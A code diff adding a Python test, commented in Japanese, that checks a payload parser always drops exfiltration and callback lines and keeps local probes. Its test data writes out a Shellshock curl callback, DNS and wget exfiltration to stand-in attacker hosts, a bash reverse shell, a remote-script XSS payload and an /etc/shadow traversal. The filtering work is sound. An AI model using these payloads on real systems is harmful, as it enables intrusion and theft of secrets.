@@ -56,6 +56,28 @@ def test_parse_payload_lines_destructive_denylist_default_and_opt_in():
     ]
 
 
+def test_parse_payload_lines_filters_exfiltration_callbacks_always():
+    # 外部コールバック/データ持ち出しは allow_destructive でも常に除外。
+    # ローカル読取の検出プローブ（持ち出しではない）は保持する。
+    text = "\n".join(
+        [
+            '() { :;}; /bin/bash -c "curl http://135.23.158.130/x?u=`whoami`"',
+            "\\n\\033[2curl http://135.23.158.130/x?u=`whoami`",  # 端末エスケープ難読化
+            "; wget http://evil.example/$(id)",
+            "nslookup `whoami`.attacker.example",
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "<svg onload=document.body.appendChild(document.createElement('script')).src='//evil/x'>",
+            "../../../../etc/shadow",          # ローカル読取プローブ → 保持
+            "; id",                            # 通常の検出プローブ → 保持
+        ]
+    )
+    for allow in (False, True):
+        result = parse_payload_lines(text, allow_destructive=allow)
+        assert result == ["../../../../etc/shadow", "; id"], (
+            f"exfiltration not filtered (allow_destructive={allow}): {result}"
+        )
+
+
 def test_build_corpus_uses_fetch_text_monkeypatch(monkeypatch):
     sources = {
         "xss": ["https://example.test/xss-1", "https://example.test/xss-2"],
